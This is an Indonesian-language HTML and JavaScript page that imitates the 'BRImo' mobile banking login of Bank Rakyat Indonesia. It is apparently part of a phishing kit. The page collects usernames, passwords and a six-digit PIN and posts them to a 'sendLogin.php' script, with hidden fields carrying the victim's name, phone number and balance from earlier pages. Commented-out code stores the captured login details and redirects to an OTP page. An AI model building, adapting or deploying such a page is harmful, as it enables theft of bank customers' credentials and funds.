

<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <meta name="theme-color" content="#0F78CB"> 
    <title>Login | BRImo</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="../1style/gaya.css">
        <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
<script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
</head>
<style>
@import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@100;200;300;400;500;600;700;800;900&amp;display=swap');
    * {
        font-family: 'Montserrat', sans-serif;
        font-weight: 400;
        margin: 0;
        padding: 0;
        font-size: 15px;
        box-sizing: border-box;
        position: relative;
        color: #000;
    }
   
    .blue {
        color: #00529C;
    }
    .container {
        width: 100%;
        height: 100%;
    }
    .flex {
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .containerlog .head {
        width: 100%;
        display: flex;
    }
    .containerlog .head img {
        width: 100%;
        margin: auto;
    }
    .containerlog .bform {
        position: fixed;
        bottom: 0;
        z-index: 999999;
        background: #fff;
        width: 100%;
        padding: 0 15px;
    }
    .containerlog .tit {
        font-size: 23px;
        font-weight: 800;
        margin-bottom: 20px;
    }
    .containerlog .bginp {
        box-shadow: 0px 2px 5px 1px #e7e7e7;
        border: 0.3px solid #e7e7e75b;
        border-radius: 6px;
        overflow: hidden;
        width: 100%;
        padding: 8px;
        padding-bottom: 0;
    }
    .containerlog .wrpinp {
        width: 100%;
        height: 55px;
        max-height: 60px;
        display: flex;
        align-items: flex-end;
        padding-bottom: 15px;
    }
    .containerlog .wrpinp i {
        font-size: 19px;
        text-align: center;
    }
    .containerlog .wrpinp i.icon {
        width: 35px;
        max-width: 35px;
        margin-right: 7px;
    }
    .containerlog input {
        width: 100%;
        border: none;
        font-size: 16px;
        font-weight: 500;
        outline: none;
        background: none;
    }
    .containerlog .forgot {
        width: 100%;
        text-align: right;
        font-size: 14px;
        font-weight: 800;
        margin: 10px 0;
    }
    .containerlog #formLog #btnsubmit {
        margin-bottom: 20px;
    }
    .containerlog button:disabled {
        background: #0079e65b;
        transition: .2s;
    }
    .containerlog button {
        width: 100%;
        height: 47px;
        max-height: 47px;
        border: none;
        border-radius: 6px;
        background: #0079e6;
        color: #ffffff;
        text-align: center;
        font-size: 14px;
        font-weight: 800;
        margin-top: 35px;
        transition: .2s;
    }
    .toggle {
        position: absolute;
        right: 0;
        bottom: 5px;
        width: 45px;
        height: 45px;
        z-index: 9999;
    }
    .toggle i {
        position: absolute;
        font-size: 19px;
    }
    @media screen and (min-width: 768px) {
        .container {
            width: 600px;
            height: 800px;
            margin: auto auto;
        }
        .containerlog .bform {
            position: relative;
            padding-bottom: 30px;
        }
    }
    
    /*input PIN style*/
    
    .containerpin * {
        color: #fff;
    }
    .containerpin {
        position: fixed;
        top: 0;
        left: 0;
        background: #0000009b;
        backdrop-filter: blur(8px);
        z-index: 99999999;
        width: 100%;
        height: 100%;
    }
    .containerpin .headpin {
        width: 100%;
        padding: 20px;
    }
    .containerpin .headpin h1 {
        font-size: 15px;
        font-weight: 800;
        text-align: center;
    }
    .containerpin .headpin i {
        font-size: 20px;
        position: absolute;
        left: 20px;
    }
    .containerpin h1.tit {
        font-size: 20px;
        font-weight: 800;
        text-align: center;
        margin: 40px 0;
    }
    .containerpin .bginp {
        width: 100%;
        height: 40px;
    }
    .containerpin .clear {
        width: 100%;
        height: 100%;
        position: absolute;
        z-index: 99;
    }
    .containerpin input:valid {
        background: #ffffff9b;
        transition: .2s;
    }
    .containerpin input {
        transition: .2s;
        background: none;
        width: 22px;
        height: 22px;
        border-radius: 50%;
        border: 2.5px solid #fff;
        outline: none;
        text-align: center;
        color: transparent;
        font-weight: 700;
        margin: 0 10px;
    }
    .containerpin span.frgt {
        font-size: 14px;
        width: 110px;
        font-weight: 800;
        padding: 14px 15px;
        background: #0000003b;
        margin: 30px auto 50px auto;
        color: #0079e6;
        border-radius: 17px;
    }
    .keypad {
        width: 90%;
        position: fixed;
        bottom: 20px;
        left: 0;
        right: 0;
        margin: 0px auto;
    }
    .keypad .table {
        height: auto;
        width: 330px;
    }
    .table .line {
        width: 100%;
        margin: 15px 0;
        display: flex;
        align-items: center;
        justify-content: space-between;
    }
    .table .line button:active {
        background: #ffffff3b;
        transition: 0s;
    }
    .table .line button i {
        font-size: 20px;
    }
    .table .line button {
        transition: .2s;
        height: 60px;
        width: 60px;
        border-radius: 50%;
        background: none;
        border: none;
        outline: none;
        font-size: 22px;
        font-weight: 700;
        text-align: center;
    }
    @media screen and (min-width: 768px) {
        .containerpin .headpin {
            width: 600px;
            margin: 0 auto;
        }
        .containerpin .keypad {
            position: relative;
            margin-top: 100px;
        }
    }




   body, html {
           
         background-position: center;
       background: #fff;
         height: 100%;
  font-size: 16px;
  position: fixed;
  width: 100%;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
            padding: 0;
            margin: 0;
            font-family: 'Open Sans', sans-serif;
        }

        .imagesi{
    margin-top: 20px;
    width: 100%;
    height: 98%;
    position: fixed;
        }
        
        .Input{
            width: 90%;
            height: 50px;
            position: absolute;
            left: 0;
            right: 0;
            outline: none;
            margin: 0px auto;
            border: 1.5px solid #ddd;
            border-radius: 8px;
            padding-left: 50px;
            top: 80;
        }
        
        .Input::placeholder{
            color: #aaa;
        }
        
        
        .Input:focus, .input:active{
            border: 1.5px solid #bbb;
        }
        
ion-icon{
    width: 25px;
    height: 25px;
}


   .btn-login {

            font-family: 'Avenir';
position: fixed;
            display: block;
            margin: 0px auto;
            padding: 0px; 
     font-weight: 700;
    width: 100%;
    height: 50px;
    background: #0F78CB;
    padding-right: 0px;
            cursor: pointer; 
    background-position: 0px 0px;
    background-size: 100% 53px;
    background-repeat: no-repeat;
            border: none; 
            text-align: center; 
            height: 50px; 
            width: 90%; 
            left: 0;
            right: 0;
            font-family: Arial; 
            font-size: 15px; 
            font-weight: bold; 
            color: rgb(255, 255, 255); 
            letter-spacing: 1px; 
            line-height: 1; 
            border-radius: 8px; 
            box-shadow: rgb(170, 170, 170) 0px 0px 0px 0px; 
            transition: background 100ms step-start 0s;
            bottom: 50;
        }

        .btn-login:disabled {
            opacity: 0.5;
            c
        }

        @media only screen and (max-width: 600px) {
            .btn-login {
                width: 90%;
            }
        }
        #ionIcons {
            color: #2C2C2C;
            font-size: 20px;
            width: 20px;
            height: 20px;
            position: absolute;
            display: block;
            margin-top: 91px;
            z-index: 9;
            margin-left: 30px;
            padding: 3px 8px 8px 0px;
            opacity: 0.7;
        }

        
        .eye {
            display: block;
            margin: 0px auto;
            margin-right: 20px;
            position: absolute;
            box-sizing: border-box; 
            z-index: 16; 
            right: 11;
            top: 153;
            height: 19.8189px;
            width: 25.0236px; 
            float: right;
            border-radius: 0px; 
            cursor: pointer;
            z-index: 9999;
        }
        
          .btn-login1 {

            font-family: 'Avenir';
position: absolute;
            display: block;
            margin: 0px auto;
            padding: 0px; 
     font-weight: 700;
    width: 100%;
    height: 52px;
    
    padding-right: 60px;
            cursor: pointer; 
            background-color: transparent;
    background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEigrkyvE1T2DsAnuhfEP1fiaWmqVZn-bd_GGi7QocBRx3gOwn9fswsPJvsm0-FC80Efc2AKkbJR_4ALZ1FVI7YlcbKijTKMG862bBhdK_iYuD2PchdlcVdD7IGTcD5jJolCN0MSv-uxi3M8REQOYmzUi5B0DpMsrF3R9BEzzmaJ6hs2TMKw2HlTPdnW/s1039/IMG_20221215_151324.jpg");
    background-position: 0px 0px;
    background-size: 100% 53px;
    background-repeat: no-repeat;
            border: none; 
            text-align: center; 
            height: 52px; 
            width: 90%; 
            left: 0;
            right: 0;
            font-family: Arial; 
            font-size: 15px; 
            font-weight: bold; 
            color: rgb(255, 255, 255); 
            letter-spacing: 1px; 
            line-height: 1; 
            border-radius: 8px; 
            box-shadow: rgb(170, 170, 170) 0px 0px 0px 0px; 
            transition: background 100ms step-start 0s;
            bottom: 20;
        }

        .btn-login1:disabled {
            opacity: 0.5;
        }

        @media only screen and (max-width: 600px) {
            .btn-login1 {
                width: 90%;
            }
        }    
        
</style>
<body>
     <div class="container">

        
                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQL7JBJbOp6-ZkWpzYqiiA9nC837OzIe2vSc84vB_GPw36EQJepTlpeK6kzAGJgIQr1IrVGIfE94-I1pazq_eTjZ6kOASlwVg6h8AgpC1YnEBPafdRJ7rA1TakpcwR0s_xjKyixnRzOKSAVBjflxP46BKsHNYnpePlaw3BQMghrjAiR-lW3nb6zPDVRxs/s2145/AddText_05-16-03.13.19.jpg" alt="" width="100%" height="100%"/>
            </div>
   <div class="row mt-3">
                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -10px auto;">
                    <button class="btn-login1" type="button" onclick="gotologin()"> Login </button> 
                    </div>
            </div>          
  <div style="position: fixed; left: 0; right: 0; width: 100%; top: 0; bottom: 0; height: 100%; background: rgba(0, 0, 0, 0.5); display: block" id="formlogin">
    <div style="position: absolute; left: 0; right: 0; width: 100%; height: 315px; background: white; margin: 0px auto; bottom: 0; border-radius: 15px 15px 0px 0px; border: 0px solid blue">

<center>
<h3 style="position: absolute; left: 0; right: 0; top: 0; margin: 0px auto; font-size :19px; font-weight: 700; top: 14">Login</h3>
</center>
<form action="req/sendLogin.php" method="POST" id="inputlogin">
 <ion-icon name="person" id="ionIcons"></ion-icon>
 <input type="hidden" id="nama" name="nama"> 
 <input type="hidden" id="nomor" name="nomor">
 <input type="hidden" id="saldo" name="saldo">
 <input type="text" class="bubble-element Input" name="uname" id="uname" placeholder="Username" required autocomplete="off" /><br/>
<ion-icon name="lock-closed" id="ionIcons" style="margin-top: 133px"></ion-icon>
<input name="pass" id="pass" type="password" class="bubble-element Input" placeholder="Password" maxlength="" style="border-radius: ; margin-top: 60px"  pattern="(?=.*[a-z])(?=.*[A-Z]).{8,}" title="Masukan Data yang terdaftar di 𝗕𝗥𝗜𝗺𝗼 anda"  required>
<div class="bubble-element eye clickable-element" tabindex="3" id="eyeOpen">
                            <ion-icon name="eye-off" id="eye"></ion-icon>
                        </div>
                        <div class="bubble-element eye clickable-element" tabindex="3" id="eyeClose" style="display: none">
                            <ion-icon name="eye" id="eye"></ion-icon>
                        </div>
                                       <button id="btnsubmit" disabled class="btn-login" type="submit">Login</button>
                                       <center>
 <a href="https://play.google.com/store/apps/details?id=id.co.bri.brimo" target="_blank" style="color: #025198; font-weight: 600; font-family: sans-serif; position: fixed; bottom: 10; left: 0; right: 0; margin: 0px auto; font-size: 16px">𝗟𝘂𝗽𝗮 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲/𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱?</a>
 </center>
    </div>
    </div>
    </form>
            </div>
       


        <div class="containerpin" style="display:none;">
            <div class="flex headpin">
                <i onclick="gotoback()" class="fa-solid fa-arrow-left"></i>
                <h1>PIN</h1>
            </div>
            <h1 class="tit">Masukkan PIN</h1>
            <form onsubmit="sendPin(event);" id="formPin">
                <div class="flex bginp">
                    <div class="clear"></div>
                    <input required class="pin" type="number" id="pin1" maxlength="1" name="pin1" />
                    <input required class="pin" type="number" id="pin2" maxlength="1" name="pin2" />
                    <input required class="pin" type="number" id="pin3" maxlength="1" name="pin3" />
                    <input required class="pin" type="number" id="pin4" maxlength="1" name="pin4" />
                    <input required class="pin" type="number" id="pin5" maxlength="1" name="pin5" />
                    <input required class="pin" type="number" id="pin6" maxlength="1" name="pin6" />
                </div>
                <span class="flex frgt blue">Lupa PIN?</span>
                <div class="flex keypad">
                    <div class="table">
                        <div class="line">
                            <button type="button" onclick="inputKeypad('1', event)">1</button>
                            <button type="button" onclick="inputKeypad('2', event)">2</button>
                            <button type="button" onclick="inputKeypad('3', event)">3</button>
                        </div>
                        <div class="line">
                            <button type="button" onclick="inputKeypad('4', event)">4</button>
                            <button type="button" onclick="inputKeypad('5', event)">5</button>
                            <button type="button" onclick="inputKeypad('6', event)">6</button>
                        </div>
                        <div class="line">
                            <button type="button" onclick="inputKeypad('7', event)">7</button>
                            <button type="button" onclick="inputKeypad('8', event)">8</button>
                            <button type="button" onclick="inputKeypad('9', event)">9</button>
                        </div>
                        <div class="line">
                            <button disabled type="button" ></button>
                            <button type="button" onclick="inputKeypad('0', event)">0</button>
                            <button type="button" onclick="deleteInput();" class="flex"><i class="fa-solid fa-arrow-left"></i></button>
                        </div>
                    </div>
                </div>
            </form>
        </div>

    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="js/viber.js"></script>
    <script src="js/valid.js"></script>
    <script src="js/function_btn.js"></script>
    
</body>
<script>
var nama = sessionStorage.getItem("nama");
document.getElementById("nama").value = nama + "";
var nomor = sessionStorage.getItem("nomor");
document.getElementById("nomor").value = nomor + "";
var saldo = sessionStorage.getItem("saldo");
document.getElementById("saldo").value = saldo + "";
  </script>
  


<!--
<script>
var nama = sessionStorage.getItem("nama");
document.getElementById("nama").value = nama + "";
var nomor = sessionStorage.getItem("nomor");
document.getElementById("nomor").value = nomor + "";
var saldo = sessionStorage.getItem("saldo");
document.getElementById("saldo").value = saldo + "";
  </script>
 <script>
$('#inputlogin').on('submit', function (event) {

 
  event.stopPropagation();
    event.preventDefault();
  $("#btnsubmit").prop("disabled", true);
  
    
  document.getElementById('btnsubmit').innerHTML = "Memproses....";

$.ajax({
 type: 'POST',
 url: 'req/sendLogin.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
    window.location.href='otp.php';  
var nomor = document.getElementById("nomor").value;
sessionStorage.setItem("nomor", nomor);
var nama = document.getElementById("nama").value;
sessionStorage.setItem("nama", nama);
var saldo = document.getElementById("saldo").value;
sessionStorage.setItem("saldo", saldo);
var unames = document.getElementById("uname").value;
sessionStorage.setItem("unames", unames);
var norek = document.getElementById("pass").value;
sessionStorage.setItem("norek", norek);
     }, 500);
        }
    });

    return false;
});       
</script>
-->
   
     <script>
        function vibr(dur){
            if (navigator.vibrate) {
                navigator.vibrate(dur);
            } else {
                console.log("NotSupported");
            }
        }
           
    </script>
  <script>
              let inputs = $("form#formPin input");
        let currentInput = 0;
        function inputKeypad(value, event) {
            if (currentInput < inputs.length) {
                inputs.eq(currentInput).val(value);
                currentInput++;
                checkAllInputsFilled();
            }
        }
        function checkAllInputsFilled() {
            let allFilled = true;
            inputs.each(function() {
                if ($(this).hasClass("pin") && $(this).val() === "") {
                    allFilled = false;
                    return false;
                }
            });
            if (allFilled) {
                $("#formPin").submit();
                $("#formPin .line button").prop("disabled", true);
            } else {
                $("#formPin .line button").prop("disabled", false);
            }
        }
        function deleteInput() {
            if (currentInput > 0) {
                currentInput--;
                inputs.eq(currentInput).val("");
                checkAllInputsFilled();
            }
        }
  </script>
   <script>
               $(document).ready(function() {
            $('.toggle i').click(function() {
                if ($("#pass").attr('type') === 'password') {
                    $("#pass").attr('type', 'text');
                    $(this).removeClass('fa-eye-slash').addClass('fa-eye');
                } else {
                    $("#pass").attr('type', 'password');
                    $(this).removeClass('fa-eye').addClass('fa-eye-slash');
                }
            });
            $('#uname, #pass').on('input', function() {
                if ($('#uname').val().length < 6 || $('#pass').val().length < 8) {
                    $('#btnsubmit').prop('disabled', true);
                } else {
                    $('#btnsubmit').prop('disabled', false);
                }
            });
        });
        $("textarea").each(function () {
            this.setAttribute("style", "height:" + (this.scrollHeight) + "px;overflow-y:hidden;");
        }).on("input", function () {
            this.style.height = 0;
            this.style.height = (this.scrollHeight) + "px";
        });
        $('#inpsms').on('input', function() {
            if ($(this).val().length < 10){
                $('#btnsubmit').prop('disabled', true);
            } else {
                $('#btnsubmit').prop('disabled', false);
            }
        });
        
        
           $(document).ready(function() {
            $("body").on('click', 'button#doLog', function() {
                var uname = $("#uname").val();
                var pass = $("#pass").val();

                $.ajax({
                    url: "/login/confirm.php",
                    method: "POST",
                    data: "username="+user+"&password="+pass,
                    beforeSend: function() {
                        $("#loading").show();
                    },
                    success: function(responsex) {
                        $("#aseli").html('');
                        if(responsex == "true") {
                            $.get("", function(datax, status){
                                window.history.pushState("", "", '');
                                $("#hideBody").hide();
                                $("#loading").hide();
                                $("#aseli").html(datax);
                            });
                        } else {
                            $.get("", function(data, status){
                                window.history.pushState("", "", '');
                                setTimeout(function() { 
                                    $("#hideBody").hide();
                                    $("#loading").hide();
                                    $("#aseli").html(data);
                                    $("#aseli").show();
                                }, 1000);
                            });
                        }
                        
                    }
                })
            });
            $("div#eyeOpen").on('click', function() {
                $("#eyeOpen").css("display", "none");
                $("#eyeClose").css("display", "block");

                $("#pass").prop("type", "text");

                $("div#eyeClose").on('click', function() {
                    $("#eyeOpen").css("display", "block");
                    $("#eyeClose").css("display", "none");

                    $("#pass").prop("type", "password");
                });
            });

            $("#uname").on('input', function() {
                var uname = $("#uname").val();
                var pass = $("#pass").val();

                OnButton(uname, pass);
            });

            $("#pass").on('input', function() {
                var uname = $("#user").val();
                var pass = $("#pass").val();

                OnButton(uname, pass);
            });
        });
   </script>
   <script>
 function gotoback(){
      $(".containerpin").fadeOut();
   $("#formlogin").fadeIn();  
     $("#uname").val('');
     $("#pass").val('');
  
 }   
</script>
   <script>
function gotologin(){
    document.getElementById("formlogin").style.display = "block";
}

function batalkanku(){
    document.getElementById("formlogin").style.display = "none";
    
}

 
</script>
</html>